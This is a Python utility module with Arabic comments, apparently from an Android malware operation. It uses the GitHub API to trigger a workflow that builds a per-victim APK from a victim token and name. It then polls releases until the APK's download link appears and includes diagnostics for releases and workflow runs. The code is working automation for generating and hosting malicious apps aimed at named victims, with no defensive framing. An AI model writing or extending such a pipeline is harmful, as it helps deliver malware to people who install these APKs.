# utils.py
# ============================================================
# دوال مساعدة — GitHub build + helper
# ============================================================

import time
import requests
from datetime import datetime

from config import GITHUB_TOKEN, GITHUB_REPO, GITHUB_WORKFLOW_FILE

from logging_config import get_logger

logger = get_logger("utils")


# ============================================================
# تشغيل البناء
# ============================================================
def trigger_victim_apk_build(victim_token, victim_name):
    """يشغّل GitHub Actions لبناء APK للضحية"""
    if not GITHUB_TOKEN:
        logger.error("[-] GITHUB_TOKEN not set")
        return False

    try:
        url = (
            f"https://api.github.com/repos/{GITHUB_REPO}"
            f"/actions/workflows/{GITHUB_WORKFLOW_FILE}/dispatches"
        )

        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
        }

        payload = {
            "ref": "main",
            "inputs": {
                "victim_token": victim_token,
                "victim_name": victim_name,
            }
        }

        r = requests.post(url, headers=headers, json=payload, timeout=15)

        if r.status_code in [204, 200]:
            logger.info(f"[+] Build triggered: {victim_name} | token={victim_token[:12]}")
            return True
        else:
            logger.error(f"[-] Build failed: HTTP {r.status_code} - {r.text[:200]}")
            return False

    except Exception as e:
        logger.exception(f"[-] trigger error: {e}")
        return False


# ============================================================
# البحث عن الـ APK
# ============================================================
def get_victim_apk_url(victim_token, max_wait=900):
    """
    ينتظر بناء APK ويرجع رابطه
    - victim_token: التوكن الكامل
    - max_wait: أقصى وقت انتظار بالثواني (افتراضي 15 دقيقة)
    """
    if not GITHUB_TOKEN:
        logger.error("[-] GITHUB_TOKEN not set")
        return None

    start = time.time()
    short_token = victim_token[:12]
    trigger_time = time.time()

    logger.info(f"[+] Waiting for APK: {short_token} | max_wait={max_wait}s")

    # نستخدم 3 استراتيجيات بحث
    while time.time() - start < max_wait:
        try:
            url = (
                f"https://api.github.com/repos/{GITHUB_REPO}"
                f"/releases?per_page=30"
            )

            headers = {
                "Authorization": f"token {GITHUB_TOKEN}",
                "Accept": "application/vnd.github.v3+json",
            }

            r = requests.get(url, headers=headers, timeout=15)

            if r.status_code != 200:
                logger.warning(f"[-] GitHub API HTTP {r.status_code}")
                time.sleep(15)
                continue

            releases = r.json()

            for release in releases:
                name = release.get("name", "") or ""
                tag = release.get("tag_name", "") or ""
                body = release.get("body", "") or ""

                # ─── الاستراتيجية 1: البحث في الاسم أو الـ tag ───
                found = (
                    short_token in name
                    or short_token in tag
                    or short_token in body
                )

                # ─── الاستراتيجية 2: البحث بالـ token الكامل ───
                if not found:
                    found = (
                        victim_token in name
                        or victim_token in tag
                        or victim_token in body
                    )

                if not found:
                    continue

                # ─── تحقق إن الـ release جديد ───
                published = release.get("published_at", "")
                if published:
                    try:
                        pub_time = datetime.strptime(
                            published,
                            "%Y-%m-%dT%H:%M:%SZ"
                        ).timestamp()

                        # ارفض أي release أقدم من وقت التشغيل
                        if pub_time < (trigger_time - 60):
                            logger.debug(f"[-] Skipping old release: {tag}")
                            continue
                    except Exception:
                        pass

                # ─── ابحث عن APK ───
                for asset in release.get("assets", []):
                    asset_name = asset.get("name", "")
                    if asset_name.endswith(".apk"):
                        apk_url = asset.get("browser_download_url")
                        apk_size = asset.get("size", 0)

                        logger.info(
                            f"[+] ✅ APK Found! "
                            f"tag={tag} | file={asset_name} | size={apk_size / 1024 / 1024:.2f}MB"
                        )
                        return apk_url

        except requests.exceptions.Timeout:
            logger.warning("[-] GitHub API timeout, retrying...")
        except Exception as e:
            logger.exception(f"[-] check error: {e}")

        # انتظر 15 ثانية قبل المحاولة التالية
        time.sleep(15)

        # طباعة تقدّم كل دقيقة
        elapsed = int(time.time() - start)
        if elapsed % 60 < 15:
            logger.info(f"[+] Still waiting... ({elapsed}s)")

    logger.warning(f"[-] Timeout: APK not found after {max_wait}s")
    return None


# ============================================================
# دوال مساعدة إضافية
# ============================================================
def list_recent_releases(limit=5):
    """يرجع آخر N releases (للتشخيص)"""
    if not GITHUB_TOKEN:
        return []

    try:
        url = (
            f"https://api.github.com/repos/{GITHUB_REPO}"
            f"/releases?per_page={limit}"
        )

        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
        }

        r = requests.get(url, headers=headers, timeout=15)

        if r.status_code != 200:
            return []

        releases = []
        for rel in r.json():
            releases.append({
                "name": rel.get("name", ""),
                "tag": rel.get("tag_name", ""),
                "published": rel.get("published_at", ""),
                "assets": [
                    a.get("name", "")
                    for a in rel.get("assets", [])
                ],
            })

        return releases

    except Exception as e:
        logger.exception(f"list_recent_releases error: {e}")
        return []


def check_workflow_runs(limit=3):
    """يتحقق من آخر تشغيلات الـ workflow (للتشخيص)"""
    if not GITHUB_TOKEN:
        return []

    try:
        url = (
            f"https://api.github.com/repos/{GITHUB_REPO}"
            f"/actions/workflows/{GITHUB_WORKFLOW_FILE}/runs?per_page={limit}"
        )

        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
        }

        r = requests.get(url, headers=headers, timeout=15)

        if r.status_code != 200:
            return []

        runs = []
        for run in r.json().get("workflow_runs", []):
            runs.append({
                "id": run.get("id"),
                "status": run.get("status"),
                "conclusion": run.get("conclusion"),
                "created_at": run.get("created_at"),
                "html_url": run.get("html_url"),
            })

        return runs

    except Exception as e:
        logger.exception(f"check_workflow_runs error: {e}")
        return []
